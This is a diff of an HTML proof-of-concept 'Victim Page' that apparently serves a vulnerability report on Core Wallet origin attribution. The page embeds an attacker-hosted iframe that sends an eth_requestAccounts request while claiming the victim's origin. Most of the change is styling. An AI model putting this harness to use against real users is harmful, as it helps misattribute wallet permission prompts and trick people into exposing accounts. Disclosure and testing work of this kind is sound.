@@ -1,62 +1,184 @@
 <!doctype html>
-<meta charset="utf-8">
-<title>Victim</title>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
 
-<h3>Victim Page</h3>
+  <title> vVictim</title>
 
-<p>Top-level Origin A:</p>
-<pre id="a"></pre>
+  <style>
+    body {
+      margin: 20px;
+      font: 16px -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      background: white;
+      color: #111;
+      line-height: 1.5;
+    }
+
+    h2 {
+      margin: 0 0 16px;
+      font-size: 21px;
+    }
+
+    code, pre {
+      font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
+    }
+
+    .info {
+      padding: 12px;
+      margin: 12px 0;
+      border: 1px solid #ccc;
+      background: #f7f7f7;
+    }
+
+    .impact {
+      padding: 12px;
+      margin-top: 15px;
+      border: 2px solid #c00;
+      background: #fff;
+      color: #b00000;
+      font-weight: 600;
+    }
+
+    button {
+      padding: 10px 14px;
+      margin: 10px 0;
+      font-size: 15px;
+      background: white;
+      color: #111;
+      border: 1px solid #888;
+      border-radius: 6px;
+    }
+
+    button:active {
+      background: #eee;
+    }
+
+    iframe {
+      width: 100%;
+      height: 60px;
+      margin-top: 15px;
+      border: 1px solid #bbb;
+      background: white;
+    }
+
+    pre {
+      padding: 12px;
+      background: #f7f7f7;
+      border: 1px solid #ddd;
+      overflow-wrap: anywhere;
+      white-space: pre-wrap;
+      font-size: 14px;
+    }
+  </style>
+</head>
+
+<body>
+
+<h2>Victim Page</h2>
+
+<div class="info">
+  <b>Victim / Origin A</b><br>
+  <span id="victim"></span>
+</div>
 
 <p>
-Cross-origin iframe B will request wallet access while claiming to be Origin A.
+A cross-origin iframe from Origin B sends
+<code>eth_requestAccounts</code> while claiming to be Origin A.
 </p>
 
-<button id="trigger">Trigger request from Origin B</button>
+<button id="trigger">
+  Trigger request from Origin B
+</button>
 
-<pre id="log"></pre>
+<div id="impact" class="impact" hidden></div>
 
-<iframe id="frame" style="width:100%;height:70px"></iframe>
+<pre id="log">Waiting for Origin B...</pre>
+
+<iframe id="frame"></iframe>
 
 <script>
-const CHILD = 'https://azza1231.github.io/pocpoc/attacker.html';
+const ATTACKER =
+  'https://azza1231.github.io/pocpoc/attacker.html';
 
 const frame = document.getElementById('frame');
 const log = document.getElementById('log');
-const childOrigin = new URL(CHILD).origin;
+const impact = document.getElementById('impact');
 
-document.getElementById('a').textContent = location.origin;
+const attackerOrigin =
+  new URL(ATTACKER).origin;
 
-const child = new URL(CHILD);
-child.searchParams.set('topOrigin', location.origin);
-frame.src = child.href;
+document.getElementById('victim').textContent =
+  location.origin;
 
-function print(x) {
-  log.textContent += x + '\n';
-}
+const attacker =
+  new URL(ATTACKER);
+
+attacker.searchParams.set(
+  'topOrigin',
+  location.origin
+);
+
+frame.src = attacker.href;
+
 
 addEventListener('message', event => {
-  if (event.source !== frame.contentWindow) return;
-  if (event.origin !== childOrigin) return;
+
+  if (event.source !== frame.contentWindow)
+    return;
+
+  if (event.origin !== attackerOrigin)
+    return;
+
 
   if (event.data === 'READY') {
-    print('Browser-confirmed Origin B: ' + event.origin);
+
+    log.textContent =
+`Browser-confirmed Origin B:
+${event.origin}
+
+Victim / Origin A:
+${location.origin}
+
+Ready. Click "Trigger request from Origin B".`;
+
   }
+
 
   if (event.data === 'SENT') {
-    print('');
-    print('Wallet request sent by Origin B.');
-    print('Actual sender : ' + event.origin);
-    print('Claimed origin: ' + location.origin);
-    print('');
-    print('Check Core Wallet UI.');
-    print('If it shows Origin A as the requester, origin attribution is bypassed.');
+
+    log.textContent =
+`Wallet request sent.
+
+Actual sender:
+${event.origin}
+
+Claimed origin:
+${location.origin}
+
+RPC:
+eth_requestAccounts`;
+
+    impact.hidden = false;
+
+    impact.textContent =
+      'Check Core Wallet native UI. ' +
+      'If Core displays Origin A as the requester, ' +
+      'the cross-origin request is being attributed to the wrong origin.';
   }
+
 });
 
+
 document.getElementById('trigger').onclick = () => {
+
   frame.contentWindow.postMessage(
     'TRIGGER',
-    childOrigin
+    attackerOrigin
   );
+
 };
 </script>
+
+</body>
+</html>
